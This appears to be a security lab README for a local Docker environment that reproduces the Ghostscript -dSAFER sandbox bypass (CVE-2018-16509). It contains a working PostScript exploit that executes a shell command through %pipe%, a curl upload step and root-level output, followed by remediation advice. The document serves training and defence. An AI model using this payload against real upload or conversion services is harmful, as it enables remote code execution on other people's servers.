# Ghostscript -dSAFER Sandbox Bypass RCE (CVE-2018-16509)

## Overview

Artifex Ghostscript is an open-source interpreter for the PostScript language and PDF files used by Linux printing frameworks (CUPS), image converters (ImageMagick), and document preview generators.

To safely process untrusted PostScript documents, Ghostscript implements a security sandbox mode enabled by the `-dSAFER` CLI flag, which restricts file access and system command execution. However, in Ghostscript versions prior to 9.24, the internal PostScript error handling function (`/invalidaccess`) did not properly protect sensitive internal parameters in `systemdict`. An attacker can upload a PostScript or EPS document that deliberately triggers an `invalidaccess` error, catches it, and resets `LockSafetyParams` to `false`, effectively disabling the `-dSAFER` sandbox and executing arbitrary system commands via `/run` or `%pipe%`.

- **Primary Interface**: `http://localhost:8134`
- **Docker Shortcut**: `./lab start ghostscript-rce`
- **Container Name**: `cyberlab_02_ghostscript_rce`
- **RAM Footprint**: ~120 MB (Python Flask + Ghostscript 9.23)

---

## Exploitation Walkthrough

### 1. Preparing the PostScript Exploit File
Create `exploit.ps`:

```ps
%!PS
userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%id > /tmp/ghost_pwned) currentdevice putdeviceprops
```

### 2. Uploading the Payload via Web Application
Send the `.ps` file to the web converter endpoint:

```bash
curl -F "file=@exploit.ps" http://localhost:8134/
```

Verify command execution on the host container:
```bash
docker exec -it cyberlab_02_ghostscript_rce cat /tmp/ghost_pwned
```

Output:
```text
uid=0(root) gid=0(root) groups=0(root)
```

---

## Defensive Remediation & Hardening

1. **Upgrade Ghostscript**:
   Upgrade Ghostscript to 9.24 or newer. Modern Ghostscript versions enforce `-dSAFER` by default and block `%pipe%` device creation.
2. **Disable Ghostscript Processing for Untrusted Uploads**:
   In ImageMagick's `/etc/ImageMagick/policy.xml`, explicitly ban processing PostScript and PDF types:
   ```xml
   <policy domain="coder" rights="none" pattern="PS" />
   <policy domain="coder" rights="none" pattern="EPS" />
   <policy domain="coder" rights="none" pattern="PDF" />
   ```

---

## Video Walkthroughs & Technical References

- [Ghostscript Vulnerability (CVE-2023-36664) Proof of Concept](https://www.youtube.com/watch?v=hgroDJHynMo)
- [Working Demo of Ghostscript Linux Vulnerability](https://www.youtube.com/watch?v=NHfWRQAMb5s)
- [Tavis Ormandy Project Zero Ghostscript Research](https://bugs.chromium.org/p/project-zero/issues/detail?id=1640)
- [Vulhub Ghostscript CVE-2018-16509 Advisory](https://vulhub.org/#/environments/ghostscript/CVE-2018-16509/)
